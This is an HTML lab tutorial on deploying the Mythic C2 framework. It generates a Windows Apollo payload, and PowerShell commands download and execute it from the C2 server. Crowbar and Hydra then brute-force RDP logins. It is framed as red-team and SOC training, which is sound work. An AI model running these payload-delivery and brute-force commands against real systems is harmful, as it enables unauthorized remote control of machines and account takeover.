<h2>💻 Demo: Deploying Mythic Server</h2>
<ul>
  <li>Deploy a new server using Vultr (Ubuntu OS, 4GB RAM, Toronto region).</li>
  <li>Download and install Kali Linux locally (VMware image recommended).</li>
  <li>SSH into the Mythic server:</li>
</ul>
<pre><code>ssh root@&lt;server-ip&gt;
</code></pre>

<h2>⚙️ Setting Up Mythic</h2>
<ul>
  <li>Update and upgrade server packages:</li>
</ul>
<pre><code>apt-get update
apt-get upgrade -y
</code></pre>
<ul>
  <li>Install Docker and Docker Compose from the official repository:</li>
</ul>
<pre><code>apt-get remove docker docker-engine docker.io containerd runc -y
apt-get update
apt-get install ca-certificates curl gnupg lsb-release -y
mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
apt-get update
apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
</code></pre>
<ul>
  <li>Install Make (confirm if needed):</li>
</ul>
<pre><code>apt install make -y
</code></pre>
<ul>
  <li>Clone Mythic repository:</li>
</ul>
<pre><code>git clone https://github.com/its-a-feature/Mythic.git
</code></pre>
<ul>
  <li>Navigate to Mythic directory and run install script:</li>
</ul>
<pre><code>cd Mythic
./install_docker_ubuntu.sh
</code></pre>
<ul>
  <li>Start Docker and verify status:</li>
</ul>
<pre><code>systemctl restart docker
systemctl enable docker
systemctl status docker
</code></pre>
<ul>
  <li>Start Mythic services:</li>
</ul>
<pre><code>make
mythic-cli start
</code></pre>

<h2>🔒 Securing Mythic Server</h2>
<ul>
  <li>Configure Vultr firewall:</li>
  <li>Allow TCP ports 1-65535 for your IP and for your Kali and Windows Server IPs.</li>
  <li>Assign the firewall to the Mythic server instance.</li>
</ul>

<h2>🌐 Accessing Mythic Web GUI</h2>
<ul>
  <li>Access Mythic at:</li>
</ul>
<pre><code>https://&lt;server-ip&gt;:7443
</code></pre>
<ul>
  <li>If HTTPS warning appears, manually prepend <code>https://</code> in URL.</li>
  <li>Find login credentials from <code>.env</code> file:</li>
</ul>
<pre><code>ls -la
cat .env
</code></pre>
<ul>
  <li>Login with <code>mythic_admin</code> and password from <code>.env</code>.</li>
  <li>Switch UI to dark mode by clicking the sun/moon icon.</li>
</ul>

<h2>🛠 Full Post-Setup Mythic Walkthrough</h2>
<ul>
  <li><strong>Install Agent (Apollo):</strong></li>
</ul>
<pre><code>cd ~/Mythic
mythic-cli install github https://github.com/MythicAgents/apollo
</code></pre>
<ul>
  <li><strong>Install C2 Profile (HTTP):</strong></li>
</ul>
<pre><code>mythic-cli install github https://github.com/MythicC2Profiles/http
</code></pre>
<ul>
  <li><strong>Restart Mythic Services:</strong></li>
</ul>
<pre><code>mythic-cli stop
mythic-cli start
</code></pre>
<ul>
  <li><strong>Generate a Payload via Web GUI:</strong></li>
  <li>Payloads &gt; Actions &gt; Generate New Payload</li>
  <li>Choose: Windows, Apollo Agent, HTTP C2 Profile, Output EXE, Fill in Callback Host/Public IP, Port 80.</li>
</ul>
<ul>
  <li><strong>Host the Payload via HTTP Server:</strong></li>
</ul>
<pre><code>python3 -m http.server 9999
</code></pre>
<ul>
  <li><strong>On Windows:</strong> Download the payload</li>
</ul>
<pre><code>Invoke-WebRequest -Uri http://&lt;mythic-ip&gt;:9999/&lt;payload.exe&gt; -OutFile C:\Users\Public\Downloads\payload.exe
</code></pre>
<ul>
  <li><strong>Execute the Payload:</strong></li>
</ul>
<pre><code>Start-Process "C:\Users\Public\Downloads\payload.exe"
</code></pre>
<ul>
  <li><strong>Monitor Callbacks in Mythic GUI:</strong></li>
</ul>
<p>See new callback session &gt; Interact &gt; Run Commands.</p>

<h2>🔨 Brute Force Using Crowbar (or Hydra as Backup)</h2>
<ul>
  <li><strong>Option 1: Crowbar Installation</strong> (preferred if working):</li>
</ul>
<pre><code>sudo apt-get install crowbar -y
</code></pre>
<ul>
  <li><strong>Running Crowbar for RDP Brute Force:</strong></li>
</ul>
<pre><code>crowbar -b rdp -u administrator -C mydfir-wordlist.txt -s &lt;target-ip&gt;/32
</code></pre>
<ul>
  <li><strong>Option 2: Hydra Installation</strong> (if Crowbar fails):</li>
</ul>
<pre><code>sudo apt install hydra -y
</code></pre>
<ul>
  <li><strong>Running Hydra for RDP Brute Force:</strong></li>
</ul>
<pre><code>hydra -l administrator -P mydfir-wordlist.txt rdp://&lt;target-ip&gt;
</code></pre>

<h2>🤔 Conclusion</h2>
<ul>
  <li>Mythic C2 offers a powerful web-based platform for red teaming and SOC defense simulations.</li>
  <li>Crowbar is a lightweight RDP brute force tool; Hydra serves as a reliable fallback.</li>
</ul>


<a href="https://github.com/MythicAgents/Apollo"> Mythic Appollo Commands</a>
